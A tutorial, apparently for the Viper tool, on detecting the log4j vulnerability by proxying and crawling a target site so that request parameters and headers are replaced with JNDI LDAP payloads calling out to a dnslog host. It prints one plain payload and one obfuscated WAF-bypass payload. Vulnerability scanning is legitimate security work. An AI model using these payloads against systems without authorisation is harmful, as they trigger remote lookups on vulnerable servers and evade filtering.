# Use Viper to scan for log4j vulnerabilities (active scan / passive scan)

# Function
## Passive scan
● automatically replace the GETrequest parameter with payload

● the automatic replacement POST request parameter is payload

● the JSON value of automatic replacement POST request is payload

● auto replace skip password field

● automatically add payload in headers (polling according to dictionary)

● payload includes the original payload and the payload bypassing WAF

```plain
${jndi:ldap://ed3bf69b5e9611ec.xxx.ceye.io/hi}

${${c:Xy:-j}${Kp:W:q:-n}${dzD:-d}${UQt:-i}${GT:-:}${s:hzr:e:-l}${e:ZSJ:yd:-d}${fA:kBl:c:-a}${Hbn:q:-p}${f:Uu:-:}${HOB:-/}${Ijk:E:-/}${dfG:-e}${F:dSj:JE:-d}${Z:-3}${BOI:Yrf:-b}${Yt:S:-f}${DKB:-6}}${Z:-b}${xdB:XBZ:-5}${dW:-e}${uC:-6}${OC:KVJ:j:-1}${L:o:-1}${jhr:-e}${d:-c}${Gi:nUE:AX:-.}${vuo:hy:Srz:-9}${xv:-f}${KG:-p}${xm:-p}${My:aQw:-b}${Mz:Xr:-j}${Z:wWt:-.}${Kx:D:-c}${Y:-e}${j:-y}${xOm:-e}${Cn:-.}${N:Tx:de:-i}${hT:h:P:-o}${qi:yx:i:-/}${j:-h}${Qfp:-i}}
```

+ The payload contains UUID, which can find the specific request content that triggers the vulnerability according to the dnslog record



## Active scan
+ Get all requests for automatic page acquisition through chrome headless + crawler, and import the requests into the passive proxy to realize automatic scanning

# Tutorials
## Passive scan
+ Update Viper version to `v1.5.10`
+ 启动VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)
+ Configure dnslog domain name

![1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4.webp](./img/c0meLUd67I2xejnp/1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4-008901.webp)
+ Set browser proxy to viperip: 28888

+ Open the target website through the browser, click freely, input information, etc

![1639677273615-41f05455-b87e-491c-b993-3b934acfa646.webp](./img/c0meLUd67I2xejnp/1639677273615-41f05455-b87e-491c-b993-3b934acfa646-144672.webp)![1639677289481-de3c8d9f-814d-46eb-889d-46847f552404.webp](./img/c0meLUd67I2xejnp/1639677289481-de3c8d9f-814d-46eb-889d-46847f552404-170675.webp)

![1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db.webp](./img/c0meLUd67I2xejnp/1639677305436-4c12539d-2dfa-451a-a0de-25919c84f0db-024025.webp)

+ Viper background will automatically replace the entered value as payload
+ Log in to dnslog platform and observe whether there are records

![1639677403210-eebfb09a-ffa9-4af6-99cc-51d8fcd5df22.webp](./img/c0meLUd67I2xejnp/1639677403210-eebfb09a-ffa9-4af6-99cc-51d8fcd5df22-007917.webp)
+ Copy the UUID information in the red box and query it on the main page

![1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc.webp](./img/c0meLUd67I2xejnp/1639677468915-79dd91a6-bee1-4a2d-a4c5-4be05425a5dc-909468.webp)
+ The query results contain specific requests that can trigger the vulnerability

![1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741.webp](./img/c0meLUd67I2xejnp/1639677504286-6361196e-c781-4c0c-8d22-fe65cca95741-420030.webp)


## Active scanning
+ Update Viper version to `v1.5.10`
+ Start VIPER

![1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864.webp](./img/c0meLUd67I2xejnp/1639676983773-2a6830c4-eea5-4995-92f4-a73706fc5864-063191.webp)
+ Configure dnslog domain name

![1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4.webp](./img/c0meLUd67I2xejnp/1639677135625-073dee2c-691f-4e16-a326-531b7c26f2b4-008901.webp)
● it is assumed here that the website to be tested is [http://target.com](http://target.com)

● install crawlergo [https://github.com/Qianlitp/crawlergo](https://github.com/Qianlitp/crawlergo)

● start the crawler and send traffic to viper's proxy

```plain
.\crawlergo.exe -c ./chrome.exe -t 3 --push-to-proxy http://viperip:28888 http://target.com
```

● wait for the webspider to finish

● log in to dnslog platform and observe whether there are records


+ Copy the UUID information in the red box and query it on the main page


+ The query result contains a specific request that can trigger the vulnerability (the request is automatically sent by crawlergo)


